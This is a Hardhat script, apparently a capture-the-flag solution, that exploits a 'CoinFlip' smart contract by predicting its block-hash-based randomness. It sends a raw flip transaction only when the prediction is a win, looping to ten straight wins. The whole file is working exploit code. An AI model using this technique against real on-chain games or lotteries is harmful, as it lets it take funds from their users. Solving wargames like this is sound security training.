import { ethers } from "hardhat";

async function main() {
  const FACTOR =
    "57896044618658097711785492504343953926634992332820282019728792003956564819968";
  const InstanceAddress = "0xe80BE121C14c294Dafb35bd7cF9F92B4E16d7691";
  const instance = await ethers.getContractAt("CoinFlip", InstanceAddress);
  let lastBlockNumber = 0;
  while ((await instance.consecutiveWins()).toNumber() < 10) {
    const currentBlockNumber = await ethers.provider.getBlockNumber();
    const currentBlockHash = (
      await ethers.provider.getBlock(currentBlockNumber)
    ).hash;
    if (
      ethers.BigNumber.from(currentBlockHash) > ethers.BigNumber.from(FACTOR) &&
      lastBlockNumber !== currentBlockNumber
    ) {
      const signer = (await ethers.getSigners())[0];
      const tx = await signer.sendTransaction({
        to: InstanceAddress,
        gasLimit: 400000,
        data: "0x1d263f670000000000000000000000000000000000000000000000000000000000000001",
      });
      await tx.wait();
      console.log("Transaction sent");
      lastBlockNumber = await ethers.provider.getBlockNumber();
      console.log("Consecutive wins: ", await instance.consecutiveWins());
    }
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
